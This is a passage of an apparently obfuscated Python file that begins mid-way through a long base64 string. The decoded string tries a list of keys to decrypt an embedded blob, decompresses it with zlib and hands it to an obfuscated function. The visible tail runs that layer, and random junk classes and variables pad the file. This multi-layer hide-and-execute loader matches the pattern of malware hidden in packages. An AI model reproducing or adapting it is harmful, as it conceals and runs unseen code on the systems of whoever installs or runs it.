ogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKJ2hVY28yYlNTWDMnClFzdEhEbWJCMmUgPSAyOTQ3ODY1Nwp2ZUphTGVYYVRnID0gODYxNDU3ODQKeWNTNmRpVkVWSSA9IDYxMTE5NTA4CnMgPSBbYid6VHNrb1lHbTY4VnJTaU9NNko5VzBQcXlLVGZTeXJhTTBOeWRWbUp2TV9rPScsIGIncGNEMjNiUlFUTDFNcUxTODROZFBzaVBkWUpsd2JUYWFsNkptdWx6VHE0az0nLCBiJzlFQlFORGpteTByR1hDYlZnVm5yZ0ZGc0FIazRZZTFNOHkxR1NJeDlDUFk9JywgYic2NjNSbks1bDBNUXpld2ZwQVFmWWhKYkwzcDdaUm9SLWo3STNEa1hpVUlrPScsIGInSTVBcnhrZ2ZvMkU1NlZCVmN0RmpKLXBGa2VCYlFnNlFYTXVHLWdOZ3FxND0nLCBiJ2VYUDFzS2ZrVEU5UE5rV1I4ckE5anpKcXVuODB5TVlQcnpNTWk2NUpRcHc9JywgYic1NlM5U3Y3elVQTDcxdzZOMk9UU3d4dkZsX2EtNXp2c042cnhRSTk3VVdVPScsIGInZ1pjUk1hVmZ0TWdfRjlFNHROUV9ldEFSN19QS1RfdlZmV3dXa01TeERRYz0nLCBiJy1YbWFLTDR1bzRwMGdNNUFSUVp0eGpaXzVlY0sxdzUzQUVrV3VpV0RJelE9JywgYidpa05mQnRyclgtOUVCSTNpS3pXbkJKVzV3Tk52aThyTTRvVDlCTHFESk53PScsIGIndUVpa0hhSEFYMUIyMGFCX2JjUXdVQTBhTzIxQWktcmdZQXFHZkt4SEtKQT0nLCBiJ2Rlb0hUd052d1RPdVFqb3k1b2g5ak5fWlFsTGJWQ3Z3STQ3RDNzUXQ4VUE9JywgYid4dWFEN0Jxd3JlbmlLWkF2Qk8zOE1PMjUwb080MEhYYm94aFU4LS02WVEwPScsIGInWDVHZllfenVrSURQS3h5em1NWUZrcHMtQXY4QW8yVFFEUG1ja3JqYjNaUT0nLCBiJ0NBT0Q3WFNXNGUtT04zM3V6NV84aDZSWmhvckRsS2c3OThlMVJjRVlTbG89JywgYidkTXBod2x3TzZRaF9GQ2RiTXpzZW9ac1drUVdQRnRHeDhWU2lGQU4yU1NvPScsIGIncTROZmNSaWVMSUtueUJ3RkVoVXhaY1JfOEEzQkZTX25fY0lFOHNGWDhhND0nLCBiJ2hMZkFQUjA2eHVvNTQ1cUpsemxZa281ZjlLS3VYT0JyQ0JOZ3pydVRWMTQ9J10KZm9yIGtleSBpbiBzOgogICAgdHJ5OgogICAgICAgIGRlY3J5cHRlZF9jb2RlID0gaFhSR0RHQ1BUclJ2Ynp3YVVsRmJtUUNvRDhPQ1k0cmpZQ094TjUoa2V5LmRlY29kZSgidXRmLTgiKSkuZGVjcnlwdChlbmNyeXB0ZWRfY29kZSkKICAgICAgICBicmVhawogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKeyd1c2VybmFtZSc6ICdzemVDanhhJywgJ2FnZSc6IDI0fQpPSzV6cHJPSkhHID0gNTU4NzU4NTkKY2xhc3MgZUdsYVNMVVdkRjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBSRnNyWlFkdFdROgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpUaTJYN1k1MjFFID0gMjM2MDA3NDUKQWJKRG1HOUI4dSA9IDE5OTM1MzU4CmNsYXNzIHNkQWtVUThjSFQ6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhClsiJ2dmSGFZZGFmRVonIiwgIid5MlJ4ZnZ1TVcwJyIsICInV0NUQXhiWm5EWiciLCAiJ0RYNk5WUHIxcFMnIiwgIidwRTlmOHd4aGxKJyJdCmNsYXNzIG9iTm9EdGpSeDM6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgUFZVTFR6aDg5YToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgbXJLaWRwamljdzoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKeFY0NzhqVVFCdCA9IDIzNzQ3NTI2CmNsYXNzIFM1NTJ1WDhJbHM6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKeDZReVFUWTRDQSA9IDc4MzExNzAKY2xhc3Mgd0RvQUJ6WlE0eToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpaSmphTXp5WW1qID0gMzM0OTc2MjkKUXJnMkFjRUsxOCA9IDExMTkwNDMwCmNsYXNzIGtJMlBPT21uWjY6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIE9tbGNEWU1qZUs6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKJ2hVY28yYlNTWDMnClFzdEhEbWJCMmUgPSAyOTQ3ODY1Nwp2ZUphTGVYYVRnID0gODYxNDU3ODQKeWNTNmRpVkVWSSA9IDYxMTE5NTA4CmRlY29tcHJlc3NlZF9jb2RlID0gemxpYi5kZWNvbXByZXNzKGRlY3J5cHRlZF9jb2RlKS5kZWNvZGUoJ3V0Zi04JykKQ1NlbFlGTnBZQVg0amhmTWlVRVFHV1EzTW9jY2hURE16b2pQV0QoZGVjb21wcmVzc2VkX2NvZGUpCnsndXNlcm5hbWUnOiAnc3plQ2p4YScsICdhZ2UnOiAyNH0KT0s1enByT0pIRyA9IDU1ODc1ODU5CmNsYXNzIGVHbGFTTFVXZEY6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgUkZzclpRZHRXUToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKVGkyWDdZNTIxRSA9IDIzNjAwNzQ1CkFiSkRtRzlCOHUgPSAxOTkzNTM1OApjbGFzcyBzZEFrVVE4Y0hUOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpbIidnZkhhWWRhZkVaJyIsICIneTJSeGZ2dU1XMCciLCAiJ1dDVEF4YlpuRFonIiwgIidEWDZOVlByMXBTJyIsICIncEU5Zjh3eGhsSiciXQpjbGFzcyBvYk5vRHRqUngzOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIFBWVUxUemg4OWE6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIG1yS2lkcGppY3c6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCnhWNDc4alVRQnQgPSAyMzc0NzUyNgpjbGFzcyBTNTUydVg4SWxzOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCng2UXlRVFk0Q0EgPSA3ODMxMTcwCmNsYXNzIHdEb0FCelpRNHk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKWkpqYU16eVltaiA9IDMzNDk3NjI5ClFyZzJBY0VLMTggPSAxMTE5MDQzMApjbGFzcyBrSTJQT09tblo2OgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBPbWxjRFlNamVLOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCidoVWNvMmJTU1gzJwpRc3RIRG1iQjJlID0gMjk0Nzg2NTcKdmVKYUxlWGFUZyA9IDg2MTQ1Nzg0CnljUzZkaVZFVkkgPSA2MTExOTUwOAo="
CSelYFNpYAX4jhfMiUEQGWQ3MocchTDMzojPWD(base64.b64decode(PZcTmMLNDhGxIyuHWAnzp4HJYLcvrDIwkJzqlN))
{'username': 'szeCjxa', 'age': 24}
OK5zprOJHG = 55875859
class eGlaSLUWdF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class RFsrZQdtWQ:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
Ti2X7Y521E = 23600745
AbJDmG9B8u = 19935358
class sdAkUQ8cHT:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'gfHaYdafEZ'", "'y2RxfvuMW0'", "'WCTAxbZnDZ'", "'DX6NVPr1pS'", "'pE9f8wxhlJ'"]
class obNoDtjRx3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class PVULTzh89a:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class mrKidpjicw:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
xV478jUQBt = 23747526
class S552uX8Ils:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
x6QyQTY4CA = 7831170
class wDoABzZQ4y:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ZJjaMzyYmj = 33497629
Qrg2AcEK18 = 11190430
class kI2POOmnZ6:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class OmlcDYMjeK:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'hUco2bSSX3'
QstHDmbB2e = 29478657
veJaLeXaTg = 86145784
ycS6diVEVI = 61119508